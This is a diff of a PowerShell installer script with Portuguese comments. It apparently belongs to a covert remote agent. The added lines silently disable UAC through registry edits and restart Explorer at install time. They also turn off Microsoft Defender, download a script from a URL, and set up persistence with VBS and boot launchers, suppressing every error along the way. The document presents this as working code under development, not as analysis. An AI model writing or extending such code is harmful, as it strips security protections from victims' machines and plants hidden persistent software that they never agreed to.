@@ -25,6 +25,17 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
+    # 1. Desativar UAC e Reiniciar Explorer (SÓ UMA VEZ NA INSTALAÇÃO)
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
+        
+        # Isso faz a tela piscar UMA VEZ e aplica o UAC off, sem reiniciar o PC
+        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue 
+    } catch {}
+
+    # 2. Desativar Defender (Sordum)
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -55,6 +66,7 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
+    # 3. Instalar arquivos e persistência
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
@@ -131,16 +143,6 @@ if (-not $isAdmin) {
     } catch {}
     exit
 }
-
-# Se chegou aqui, o agente JÁ ESTÁ RODANDO COMO ADMINISTRADOR.
-# Vamos desativar a tela preta do UAC e forçar a atualização sem reiniciar o PC.
-try {
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
-    # Reiniciar o Explorer faz o Windows recarregar as regras do UAC na hora, sem reiniciar o PC
-    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
-} catch {}
 
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
